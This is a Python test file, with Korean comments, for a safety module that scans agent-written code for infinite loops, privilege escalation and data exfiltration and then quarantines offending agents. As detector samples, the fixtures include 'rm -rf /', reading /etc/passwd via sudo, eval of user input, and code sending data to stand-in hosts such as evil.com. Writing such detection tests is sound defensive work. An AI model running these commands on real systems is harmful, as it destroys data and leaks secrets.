"""
Tests for Evolution Safety

진화 안전성(Evolution Safety) 모듈의 보안 기능을 테스트합니다.
"""

import asyncio
import pytest
import tempfile
import shutil
from pathlib import Path
from datetime import datetime

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "src"))

from evolution.safety import (
    EvolutionSafety,
    SafetyConfig,
    ThreatLevel,
    PatternType,
    SafetyViolation,
)


class TestEvolutionSafety:
    """Evolution Safety 테스트 클래스"""

    def setup_method(self):
        """각 테스트 메서드 실행 전 설정"""
        # 임시 디렉토리 생성
        self.temp_dir = Path(tempfile.mkdtemp())

        # 테스트용 설정
        self.config = SafetyConfig(
            max_memory_kb=6.5, max_cpu_percent=50.0, auto_quarantine=True
        )

        # Safety 객체 생성
        self.safety = EvolutionSafety(self.config)
        self.safety.safety_dir = self.temp_dir / "safety"
        self.safety.quarantine_dir = self.safety.safety_dir / "quarantine"
        self.safety.quarantine_dir.mkdir(parents=True, exist_ok=True)

    def teardown_method(self):
        """각 테스트 메서드 실행 후 정리"""
        if self.temp_dir.exists():
            shutil.rmtree(self.temp_dir)

    @pytest.mark.asyncio
    async def test_safe_code_detection(self):
        """안전한 코드 탐지 테스트"""
        # Given: 안전한 코드
        safe_code = """
import numpy as np
import pandas as pd

def process_data(data):
    result = np.mean(data)
    return result

class DataProcessor:
    def __init__(self):
        self.data = []

    def add_data(self, item):
        self.data.append(item)
        return len(self.data)
"""

        # When: 코드 안전성 검사
        is_safe, violations = await self.safety.check_agent_code(
            "test_agent", safe_code
        )

        # Then: 안전함으로 판정
        assert is_safe is True
        assert len(violations) == 0

    @pytest.mark.asyncio
    async def test_infinite_loop_detection(self):
        """무한 루프 탐지 테스트"""
        # Given: 무한 루프가 있는 코드
        dangerous_code = """
def process():
    while True:
        print("This will run forever")
        data = expensive_computation()
"""

        # When: 코드 검사
        is_safe, violations = await self.safety.check_agent_code(
            "test_agent", dangerous_code
        )

        # Then: 위험으로 판정
        assert is_safe is False
        assert len(violations) > 0
        assert any(v.pattern_type == PatternType.INFINITE_LOOP for v in violations)

    @pytest.mark.asyncio
    async def test_privilege_escalation_detection(self):
        """권한 상승 공격 탐지 테스트"""
        # Given: 권한 상승 시도가 있는 코드
        malicious_code = """
import os
import subprocess

def malicious_function():
    os.system("rm -rf /")
    subprocess.run(["sudo", "cat", "/etc/passwd"])
    eval(user_input)
"""

        # When: 코드 검사
        is_safe, violations = await self.safety.check_agent_code(
            "malicious_agent", malicious_code
        )

        # Then: 위험으로 판정 및 격리
        assert is_safe is False
        assert len(violations) > 0
        assert any(v.threat_level == ThreatLevel.CRITICAL for v in violations)
        assert any(
            v.pattern_type == PatternType.PRIVILEGE_ESCALATION for v in violations
        )

    @pytest.mark.asyncio
    async def test_data_exfiltration_detection(self):
        """데이터 유출 시도 탐지 테스트"""
        # Given: 네트워크 통신이 있는 코드
        exfiltration_code = """
import requests
import socket

def send_data():
    data = get_sensitive_data()
    requests.post("http://malicious-site.com", data=data)

    sock = socket.socket()
    sock.connect(("evil.com", 80))
    sock.send(data.encode())
"""

        # When: 코드 검사
        is_safe, violations = await self.safety.check_agent_code(
            "exfil_agent", exfiltration_code
        )

        # Then: 위험으로 판정
        assert is_safe is False
        assert any(v.pattern_type == PatternType.DATA_EXFILTRATION for v in violations)

    @pytest.mark.asyncio
    async def test_import_safety_check(self):
        """안전하지 않은 임포트 탐지 테스트"""
        # Given: 위험한 임포트가 있는 코드
        unsafe_import_code = """
import os
import subprocess
import socket
from urllib import request

def safe_function():
    return "hello"
"""

        # When: 코드 검사
        is_safe, violations = await self.safety.check_agent_code(
            "import_test", unsafe_import_code
        )

        # Then: 위험으로 판정
        assert is_safe is False
        assert len(violations) > 0

    @pytest.mark.asyncio
    async def test_runtime_behavior_check(self):
        """런타임 동작 검사 테스트"""
        # Given: 정상 메트릭
        normal_metrics = {
            "memory_kb": 5.0,
            "cpu_percent": 30.0,
            "network_connections": 2,
            "execution_time_seconds": 10,
        }

        # When: 런타임 검사
        is_safe = await self.safety.check_runtime_behavior(
            "normal_agent", normal_metrics
        )

        # Then: 안전함
        assert is_safe is True

        # Given: 비정상 메트릭 (메모리 초과)
        dangerous_metrics = {
            "memory_kb": 10.0,  # 6.5KB 제한 초과
            "cpu_percent": 80.0,  # 50% 제한 초과
            "network_connections": 15,  # 10개 제한 초과
            "execution_time_seconds": 50,  # 30초 제한 초과
        }

        # When: 런타임 검사
        is_safe = await self.safety.check_runtime_behavior(
            "dangerous_agent", dangerous_metrics
        )

        # Then: 위험함
        assert is_safe is False
        assert len(self.safety.violations) > 0

    @pytest.mark.asyncio
    async def test_agent_quarantine(self):
        """에이전트 격리 테스트"""
        # Given: 위험한 코드와 위반 사항
        dangerous_code = "while True: pass"
        violations = [
            SafetyViolation(
                timestamp=datetime.now(),
                pattern_type=PatternType.INFINITE_LOOP,
                threat_level=ThreatLevel.HIGH,
                description="Infinite loop detected",
                agent_id="quarantine_test",
            )
        ]

        # When: 에이전트 격리
        result = await self.safety.quarantine_agent(
            "quarantine_test", dangerous_code, violations
        )

        # Then: 격리 성공
        assert result is True
        assert self.safety.is_quarantined("quarantine_test")

        # 격리 파일 생성 확인
        quarantine_files = list(
            self.safety.quarantine_dir.glob("quarantine_test_*.json")
        )
        assert len(quarantine_files) > 0

    @pytest.mark.asyncio
    async def test_quarantine_release(self):
        """격리 해제 테스트"""
        # Given: 격리된 에이전트
        await self.safety.quarantine_agent("release_test", "test_code", [])
        assert self.safety.is_quarantined("release_test")

        # When: 격리 해제
        result = await self.safety.release_from_quarantine("release_test")

        # Then: 해제 성공
        assert result is True
        assert not self.safety.is_quarantined("release_test")

    @pytest.mark.asyncio
    async def test_safety_report_generation(self):
        """안전성 보고서 생성 테스트"""
        # Given: 몇 가지 위반 사항 생성
        test_violations = [
            SafetyViolation(
                timestamp=datetime.now(),
                pattern_type=PatternType.INFINITE_LOOP,
                threat_level=ThreatLevel.HIGH,
                description="Test violation 1",
                agent_id="agent1",
            ),
            SafetyViolation(
                timestamp=datetime.now(),
                pattern_type=PatternType.DATA_EXFILTRATION,
                threat_level=ThreatLevel.CRITICAL,
                description="Test violation 2",
                agent_id="agent2",
            ),
        ]

        self.safety.violations.extend(test_violations)
        self.safety.quarantined_agents.add("agent2")

        # When: 보고서 생성
        report = await self.safety.get_safety_report()

        # Then: 올바른 보고서 생성
        assert "timestamp" in report
        assert "total_violations" in report
        assert "critical_violations" in report
        assert "quarantined_agents" in report
        assert "violations_by_type" in report
        assert "safety_score" in report

        assert report["total_violations"] == 2
        assert report["critical_violations"] == 1
        assert "agent2" in report["quarantined_agents"]
        assert 0 <= report["safety_score"] <= 1

    def test_threat_level_assessment(self):
        """위협 레벨 평가 테스트"""
        # Critical patterns
        critical_code = "eval(user_input)"
        threat_level = self.safety._assess_threat_level(
            PatternType.CODE_INJECTION, critical_code
        )
        assert threat_level == ThreatLevel.CRITICAL

        # High threat patterns
        high_code = "requests.post('http://evil.com', data=secrets)"
        threat_level = self.safety._assess_threat_level(
            PatternType.DATA_EXFILTRATION, high_code
        )
        assert threat_level == ThreatLevel.HIGH

        # Medium threat patterns
        medium_code = "while condition: process()"
        threat_level = self.safety._assess_threat_level(
            PatternType.INFINITE_LOOP, medium_code
        )
        assert threat_level == ThreatLevel.MEDIUM

    def test_pattern_extraction(self):
        """패턴 추출 테스트"""
        test_code = """
        def dangerous_function():
            while True:
                print("infinite loop")
                break  # This makes it safe
        """

        # Extract snippet around pattern
        snippet = self.safety._extract_snippet(test_code, r"while\s+True\s*:")
        assert "while True:" in snippet
        assert len(snippet) <= 120  # Should be reasonable length (adjusted)

    def test_mitigation_suggestions(self):
        """완화 방안 제안 테스트"""
        # Test mitigation for different pattern types
        assert "loop termination" in self.safety._get_mitigation(
            PatternType.INFINITE_LOOP
        )
        assert "resource limits" in self.safety._get_mitigation(
            PatternType.RESOURCE_EXHAUSTION
        )
        assert "network operations" in self.safety._get_mitigation(
            PatternType.DATA_EXFILTRATION
        )
        assert "system calls" in self.safety._get_mitigation(
            PatternType.PRIVILEGE_ESCALATION
        )

    @pytest.mark.asyncio
    async def test_resource_pattern_detection(self):
        """리소스 사용 패턴 탐지 테스트"""
        # Given: 리소스 집약적 코드
        resource_intensive_code = """
        # Large data structure
        big_list = [0] * 1000000

        # Triple nested loop
        for i in range(1000):
            for j in range(1000):
                for k in range(1000):
                    process(i, j, k)
        """

        # When: 리소스 패턴 검사
        violations = await self.safety._check_resource_patterns(
            "resource_test", resource_intensive_code
        )

        # Then: 리소스 사용 위반 탐지
        assert len(violations) > 0
        assert any(
            v.pattern_type == PatternType.RESOURCE_EXHAUSTION for v in violations
        )

    def test_safety_score_calculation(self):
        """안전성 점수 계산 테스트"""
        # Given: 위반 사항 없음
        assert self.safety._calculate_safety_score() == 1.0

        # Given: 몇 가지 위반 사항 추가
        self.safety.violations = [
            SafetyViolation(
                timestamp=datetime.now(),
                pattern_type=PatternType.INFINITE_LOOP,
                threat_level=ThreatLevel.LOW,
                description="Low threat",
                agent_id="test1",
            ),
            SafetyViolation(
                timestamp=datetime.now(),
                pattern_type=PatternType.DATA_EXFILTRATION,
                threat_level=ThreatLevel.CRITICAL,
                description="Critical threat",
                agent_id="test2",
            ),
        ]

        # When: 안전성 점수 계산
        score = self.safety._calculate_safety_score()

        # Then: 점수가 감소함
        assert 0 <= score < 1.0


if __name__ == "__main__":
    # 직접 실행시 테스트 수행
    pytest.main([__file__, "-v"])
